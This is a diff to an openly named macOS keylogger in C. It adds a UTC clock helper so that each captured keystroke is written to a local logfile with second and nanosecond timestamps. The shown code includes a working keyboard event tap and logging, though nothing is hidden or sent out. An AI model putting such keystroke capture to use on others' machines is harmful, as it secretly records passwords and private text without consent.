@@ -1,6 +1,28 @@
+//https://github.com/caseyscarborough/keylogger
 #include "keylogger.h"
 
+// clock code https://gist.github.com/jbenet/1087739
+void current_utc_time(struct timespec *ts) {
+#ifdef __MACH__ // OS X does not have clock_gettime, use clock_get_time
+    clock_serv_t cclock;
+    mach_timespec_t mts;
+    host_get_clock_service(mach_host_self(), CALENDAR_CLOCK, &cclock);
+    clock_get_time(cclock, &mts);
+    mach_port_deallocate(mach_task_self(), cclock);
+    ts->tv_sec = mts.tv_sec;
+    ts->tv_nsec = mts.tv_nsec;
+#else
+    clock_gettime(CLOCK_REALTIME, ts);
+#endif
+}
+
 int main(int argc, const char *argv[]) {
+    
+    struct timespec ts;
+    current_utc_time(&ts);
+    
+    //printf("s:  %lu\n", ts.tv_sec);
+    //printf("ns: %lu\n", ts.tv_nsec);
 
     // Create an event tap to retrieve keypresses.
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
@@ -47,6 +69,7 @@ int main(int argc, const char *argv[]) {
 
     // Display the location of the logfile and start the loop.
     printf("Logging to: %s\n", logfileLocation);
+    
     fflush(stdout);
     CFRunLoopRun();
 
@@ -59,9 +82,13 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-
+    struct timespec ts;
+    current_utc_time(&ts);
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    // fprintf(logfile, "%s", convertKeyCode(keyCode));
+    // fprintf(logfile, "%u,%s\n", (unsigned)time(NULL),convertKeyCode(keyCode));
+    fprintf(logfile, "%lu,%lu,%s\n",ts.tv_sec,ts.tv_nsec,convertKeyCode(keyCode));
+
     fflush(logfile);
 
     return event;
